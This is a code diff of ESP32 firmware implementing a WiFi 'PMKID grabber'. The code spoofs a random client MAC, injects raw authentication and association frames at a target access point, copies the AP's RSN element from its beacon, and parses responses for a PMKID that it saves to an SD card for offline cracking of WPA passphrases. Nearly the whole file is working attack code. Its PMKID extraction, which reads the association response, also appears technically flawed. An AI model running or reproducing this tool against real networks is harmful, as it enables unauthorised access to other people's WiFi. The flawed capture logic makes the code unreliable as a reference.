@@ -1,120 +1,183 @@
-#include "PMKIDGrabber.h"
-#include "EapolSniffer.h"
-#include "networkKit.h"
-#include "logger.h"
 #include <esp_wifi.h>
+#include <esp_timer.h>
+#include <Arduino.h>
 #include <SD.h>
+#include "logger.h"
 
-bool GrabPMKIDForAP(const uint8_t* apBSSID, const String& ssid, int channel, int attempts, int delayMs, int timeoutMs) {
+static uint8_t targetBSSID[6];
+static bool targetSet = false;
+static bool pmkidFound = false;
+static String pmkidValue;
+
+static uint8_t beaconRSN[64];
+static int beaconRSNLen = 0;
+
+static uint8_t clientMAC[6];
+
+static void genClientMAC() {
+    for (int i = 0; i < 6; i++) clientMAC[i] = esp_random() & 0xFF;
+    clientMAC[0] = (clientMAC[0] & 0xFE) | 0x02;
+}
+
+static void setTarget(const uint8_t *bssid) {
+    memcpy(targetBSSID, bssid, 6);
+    targetSet = true;
+}
+
+static void writePMKID(const uint8_t *bssid, const uint8_t *pmkid) {
+    char hex[33];
+    for (int i = 0; i < 16; i++) sprintf(hex + i * 2, "%02X", pmkid[i]);
+    hex[32] = 0;
+
+    pmkidValue = String(hex);
+    pmkidFound = true;
+
+    char path[64];
+    snprintf(path, sizeof(path),
+             "/pmkid/%02X_%02X_%02X_%02X_%02X_%02X.txt",
+             bssid[0], bssid[1], bssid[2],
+             bssid[3], bssid[4], bssid[5]);
+
+    if (!SD.exists("/pmkid")) SD.mkdir("/pmkid");
+    File f = SD.open(path, FILE_APPEND);
+    if (f) {
+        f.println(pmkidValue);
+        f.close();
+    }
+
+    logMessage("PMKID captured: " + pmkidValue);
+}
+
+bool GrabPMKIDForAP(const uint8_t *apBSSID, int channel, int timeoutMs) {
     if (!apBSSID) return false;
 
-    // Prepare sniffer
-    setTargetAP((uint8_t*)apBSSID, ssid);
-    clearPMKIDFlag();
-    if (!SnifferBegin(channel, true)) {
-        logMessage("PMKIDGrabber: Failed to start sniffer");
+    pmkidFound = false;
+    beaconRSNLen = 0;
+    setTarget(apBSSID);
+    genClientMAC();
+
+    esp_wifi_set_promiscuous(true);
+    esp_wifi_set_channel(channel, WIFI_SECOND_CHAN_NONE);
+
+    // ---- AUTH FRAME (Open System, correct 30 bytes) ----
+    uint8_t auth[30] = {
+        0xB0, 0x00, 0x00, 0x00,
+        apBSSID[0], apBSSID[1], apBSSID[2], apBSSID[3], apBSSID[4], apBSSID[5],
+        clientMAC[0], clientMAC[1], clientMAC[2], clientMAC[3], clientMAC[4], clientMAC[5],
+        apBSSID[0], apBSSID[1], apBSSID[2], apBSSID[3], apBSSID[4], apBSSID[5],
+        0x00, 0x00,
+        0x00, 0x00, // algorithm = open
+        0x01, 0x00, // seq 1
+        0x00, 0x00  // status
+    };
+
+    esp_wifi_80211_tx(WIFI_IF_STA, auth, sizeof(auth), false);
+    vTaskDelay(20 / portTICK_PERIOD_MS);
+
+    // ---- Wait for beacon RSN ----
+    uint32_t start = millis();
+    while (beaconRSNLen == 0 && millis() - start < 1000) {
+        vTaskDelay(10 / portTICK_PERIOD_MS);
+    }
+
+    if (beaconRSNLen == 0) {
+        logMessage("No RSN IE from beacon");
         return false;
     }
 
-    // Generate a random client MAC (locally administered)
-    uint8_t client_mac[6];
-    for (int i = 0; i < 6; i++) client_mac[i] = random(256);
-    client_mac[0] = (client_mac[0] & 0xFE) | 0x02; // locally administered
+    // ---- Build ASSOC REQ using beacon RSN ----
+    uint8_t assoc[256] = {0};
+    int p = 0;
 
-    // Fill auth frame (simple open system)
-    uint8_t auth_frame[26] = {
-        0xB0, 0x00, // Mgmt Auth
-        0x00, 0x00, // Duration
-        // DA (AP)
-        apBSSID[0], apBSSID[1], apBSSID[2], apBSSID[3], apBSSID[4], apBSSID[5],
-        // SA (Client)
-        client_mac[0], client_mac[1], client_mac[2], client_mac[3], client_mac[4], client_mac[5],
-        // BSSID (AP)
-        apBSSID[0], apBSSID[1], apBSSID[2], apBSSID[3], apBSSID[4], apBSSID[5],
-        0x00, 0x00, // Sequence
-        0x00, 0x01  // Auth algorithm 0 (Open), seq 1
-    };
+    assoc[p++] = 0x00; assoc[p++] = 0x00;
+    assoc[p++] = 0x00; assoc[p++] = 0x00;
 
-    // Association Request with RSN PMKID request - base template
-    uint8_t assoc_req[200];
-    memset(assoc_req, 0x00, sizeof(assoc_req));
-    // Basic header
-    assoc_req[0] = 0x00; assoc_req[1] = 0x00; // Assoc Req
-    // duration
-    assoc_req[2] = 0x00; assoc_req[3] = 0x00;
-    // DA (AP)
-    memcpy(&assoc_req[4], apBSSID, 6);
-    // SA (Client)
-    memcpy(&assoc_req[10], client_mac, 6);
-    // BSSID (AP)
-    memcpy(&assoc_req[16], apBSSID, 6);
-    // Seq/fragment
-    assoc_req[22] = 0x10; assoc_req[23] = 0x00;
-    // Fixed params: capability (ESS + Privacy)
-    assoc_req[24] = 0x11; assoc_req[25] = 0x00;
-    // Listen interval
-    assoc_req[26] = 0x00; assoc_req[27] = 0x10;
+    memcpy(&assoc[p], apBSSID, 6); p += 6;
+    memcpy(&assoc[p], clientMAC, 6); p += 6;
+    memcpy(&assoc[p], apBSSID, 6); p += 6;
 
-    // SSID tag
-    int pos = 28;
-    assoc_req[pos++] = 0x00;
-    assoc_req[pos++] = ssid.length();
-    for (size_t i = 0; i < ssid.length() && i < 32; i++) {
-        assoc_req[pos++] = ssid[i];
+    assoc[p++] = 0x10; assoc[p++] = 0x00;
+    assoc[p++] = 0x31; assoc[p++] = 0x04;
+    assoc[p++] = 0x00; assoc[p++] = 0x10;
+
+    // minimal SSID wildcard
+    assoc[p++] = 0x00; assoc[p++] = 0x00;
+
+    // rates
+    uint8_t rates[] = {0x01,0x08,0x82,0x84,0x8B,0x96,0x0C,0x12,0x18,0x24};
+    memcpy(&assoc[p], rates, sizeof(rates)); p += sizeof(rates);
+
+    // RSN IE copied from beacon
+    memcpy(&assoc[p], beaconRSN, beaconRSNLen);
+    p += beaconRSNLen;
+
+    esp_wifi_80211_tx(WIFI_IF_STA, assoc, p, false);
+
+    start = millis();
+    while (!pmkidFound && millis() - start < (uint32_t)timeoutMs) {
+        vTaskDelay(20 / portTICK_PERIOD_MS);
     }
 
-    // Supported rates tag (8 bytes)
-    assoc_req[pos++] = 0x01; assoc_req[pos++] = 0x08;
-    uint8_t rates[] = {0x82,0x84,0x8b,0x96,0x0c,0x12,0x18,0x24};
-    memcpy(&assoc_req[pos], rates, sizeof(rates)); pos += sizeof(rates);
+    return pmkidFound;
+}
 
-    // Extended rates
-    assoc_req[pos++] = 0x32; assoc_req[pos++] = 0x04;
-    uint8_t erates[] = {0x30,0x48,0x60,0x6c};
-    memcpy(&assoc_req[pos], erates, sizeof(erates)); pos += sizeof(erates);
+// ------------------------------------------------------------
+// PROMISCUOUS CALLBACK
+// ------------------------------------------------------------
+void IRAM_ATTR wifi_sniffer_cb(void *buf, wifi_promiscuous_pkt_type_t type) {
+    if (type != WIFI_PKT_MGMT && type != WIFI_PKT_DATA) return;
 
-    // RSN IE (PMKID request) - 32 bytes
-    uint8_t rsn_ie[] = {
-        0x30, 0x20, // Tag 48, length 32
-        0x01, 0x00, // Version 1
-        0x00, 0x0f, 0xac, 0x04, // Group cipher: CCMP
-        0x02, 0x00, // Pairwise suite count: 1
-        0x00, 0x0f, 0xac, 0x04, // Pairwise: CCMP
-        0x01, 0x00, // AKM suite count: 1
-        0x00, 0x0f, 0xac, 0x02, // AKM: PSK
-        0x00, 0x00, // RSN capabilities
-        0x01, 0x00, // PMKID count: 1 (REQUEST!)
-        0x00, 0x00, 0x00, 0x00 // Empty PMKID list (requests from AP)
-    };
-    memcpy(&assoc_req[pos], rsn_ie, sizeof(rsn_ie)); pos += sizeof(rsn_ie);
+    auto *pkt = (wifi_promiscuous_pkt_t *)buf;
+    const uint8_t *pl = pkt->payload;
+    int len = pkt->rx_ctrl.sig_len;
+    if (len < 24) return;
 
-    int assoc_len = pos;
+    uint16_t fc = pl[0] | (pl[1] << 8);
+    uint8_t ftype = (fc >> 2) & 0x3;
+    uint8_t fsub  = (fc >> 4) & 0xF;
 
-    logMessage("Starting PMKID grabber against: " + macToString(apBSSID));
+    // ---- Beacon: capture RSN ----
+    if (ftype == 0 && fsub == 8 && targetSet) {
+        if (memcmp(pl + 16, targetBSSID, 6) != 0) return;
 
-    // send frames
-    for (int i = 0; i < attempts && !pmkidFound; i++) {
-        esp_wifi_80211_tx(WIFI_IF_STA, auth_frame, sizeof(auth_frame), false);
-        vTaskDelay(delayMs / portTICK_PERIOD_MS);
-    }
-    vTaskDelay(50 / portTICK_PERIOD_MS);
-    for (int i = 0; i < attempts && !pmkidFound; i++) {
-        esp_wifi_80211_tx(WIFI_IF_STA, assoc_req, assoc_len, false);
-        vTaskDelay(delayMs / portTICK_PERIOD_MS);
+        int pos = 36;
+        while (pos + 2 < len) {
+            uint8_t tag = pl[pos];
+            uint8_t tlen = pl[pos + 1];
+            if (pos + 2 + tlen > len) break;
+
+            if (tag == 48 && tlen < sizeof(beaconRSN)) {
+                memcpy(beaconRSN, &pl[pos], tlen + 2);
+                beaconRSNLen = tlen + 2;
+                return;
+            }
+            pos += 2 + tlen;
+        }
     }
 
-    // wait for detection or timeout
-    unsigned long start = millis();
-    while (!pmkidFound && (millis() - start < (unsigned long)timeoutMs)) {
-        vTaskDelay(50 / portTICK_PERIOD_MS);
-    }
+    // ---- Assoc Resp PMKID ----
+    if (ftype == 0 && fsub == 1 && targetSet) {
+        if (memcmp(pl + 16, targetBSSID, 6) != 0) return;
 
-    SnifferEnd();
+        int pos = 30;
+        while (pos + 2 < len) {
+            uint8_t tag = pl[pos];
+            uint8_t tlen = pl[pos + 1];
+            if (pos + 2 + tlen > len) break;
 
-    if (pmkidFound) {
-        logMessage("PMKIDGrabber: PMKID captured: " + pmkidLastValue);
-        return true;
+            if (tag == 48 && tlen >= 20) {
+                const uint8_t *rsn = pl + pos + 2;
+                int p = 8;
+                uint16_t pc = rsn[p] | (rsn[p+1] << 8); p += 2 + 4*pc;
+                uint16_t ak = rsn[p] | (rsn[p+1] << 8); p += 2 + 4*ak;
+                p += 2;
+                uint16_t pmc = rsn[p] | (rsn[p+1] << 8); p += 2;
+                if (pmc && p + 16 <= tlen) {
+                    writePMKID(targetBSSID, rsn + p);
+                }
+                return;
+            }
+            pos += 2 + tlen;
+        }
     }
-    logMessage("PMKIDGrabber: No PMKID captured.");
-    return false;
 }
